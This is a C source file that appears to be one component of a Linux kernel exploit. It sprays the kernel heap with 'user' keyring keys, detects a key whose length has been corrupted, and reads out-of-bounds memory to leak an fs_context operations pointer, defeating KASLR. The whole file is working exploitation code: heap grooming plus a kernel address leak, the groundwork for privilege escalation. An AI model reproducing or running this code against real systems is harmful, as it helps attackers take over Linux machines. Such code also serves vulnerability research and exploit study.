#include <limits.h>
#include <linux/keyctl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "common.h"
#include "keyring.h"
#include "log.h"

void spray_keyring(key_serial_t *id_buffer, uint32_t spray_size) {
    char key_desc[0x20];
    char key_payload[KEY_PAYLOAD_SIZE + 1] = {0};

    for (uint32_t i = 0; i < spray_size; i++) {
        snprintf(key_desc, sizeof(key_desc), "spray_key_%d", i);
        memset(key_payload, 'A', KEY_PAYLOAD_SIZE);
        for (int j = 0; j < 3; j++) {
            // retry, after KEYCTL_REVOKE, the key is scheduled for garbage collection,
            //  so it is not freed immediately
            id_buffer[i] = add_key("user", key_desc, key_payload, strlen(key_payload), KEY_SPEC_PROCESS_KEYRING);
            if (id_buffer[i] < 0) {
                usleep(100 * 1000); // 100ms
            } else {
                break;
            }
        }

        if (id_buffer[i] < 0) {
            die("add_key %d: %m", i);
        }
    }
}

int is_keyring_corrupted(key_serial_t *id_buffer, uint32_t id_buffer_size, key_serial_t *corrupted_key_id) {
    uint8_t buffer[CORRUPT_SIZE] = {0};
    int32_t keylen;

    for (uint32_t i = 0; i < id_buffer_size; i++) {
        if (!id_buffer[i]) {
            continue;
        }

        keylen = keyctl(KEYCTL_READ, id_buffer[i], (long)buffer, CORRUPT_SIZE, 0);
        if (keylen < 0)
            die("keyctl: %m");

        if (keylen == CORRUPT_SIZE) {
            *corrupted_key_id = id_buffer[i];
            return 1;
        }
    }
    return 0;
}

int get_keyring_leak(key_serial_t id_buffer, struct leak_data *data) {
    uint8_t buffer[CORRUPT_SIZE] = {0};
    int32_t keylen;

    keylen = keyctl(KEYCTL_READ, id_buffer, (long)buffer, CORRUPT_SIZE, 0);
    if (keylen < 0) {
        die("keyctl: %m");
    }

    if (keylen == CORRUPT_SIZE) {
        char *ptr = buffer;
        ptr += (192 - 24);
        while (ptr < (char *)buffer + CORRUPT_SIZE - 192) {
            if (*(ptr + 154) == 1 &&
                (*(uint64_t *)(ptr + 0) & 0xffff000000000000) == 0xffff000000000000) {
                logi("find fs_context!");
                data->fs_context_ops = *(uint64_t *)(ptr + 0);
                getchar();
                return 0;
            }
            ptr += 192;
        }
    }
    return 1;
}

void release_key(key_serial_t id_buffer) {
    if (id_buffer) {
        if (keyctl(KEYCTL_REVOKE, id_buffer, 0, 0, 0) < 0) {
            die("keyctl(KEYCTL_REVOKE): %m");
        }
    }
}

void release_keys(key_serial_t *id_buffer, uint32_t id_buffer_size) {
    for (uint32_t i = 0; i < id_buffer_size; i++) {
        release_key(id_buffer[i]);
        id_buffer[i] = 0;
    }
}
